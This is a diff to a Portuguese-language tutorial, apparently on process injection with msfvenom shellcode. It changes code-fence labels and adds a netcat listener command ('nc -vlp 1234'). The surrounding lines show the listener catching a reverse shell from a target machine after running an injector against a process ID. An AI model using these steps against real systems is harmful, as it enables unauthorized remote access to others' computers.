@@ -98,7 +98,7 @@ para vermos o PID podemos usar o "ProcessHacker" ou "procexp"
 - Abrir a porta que colocamos como argumento no msfvenom para gerar o shellcode, no computador com o IP que também colocamos como argumento no msfvenom para gerar o shellcode :
 
 
-```cmd
+```bash
 nc -vlp 1234
 ```
 
@@ -112,7 +112,8 @@ injectremotePID.exe 2004
 - Feito isso, já devemos ganhar o acesso no alvo.
 
 
-```cmd
+```bash
+nc -vlp 1234
 listening on [any] 1234 ...
 192.168.10.109: inverse host lookup failed: Host name lookup failure
 connect to [192.168.10.113] from (UNKNOWN) [192.168.10.109] 49173
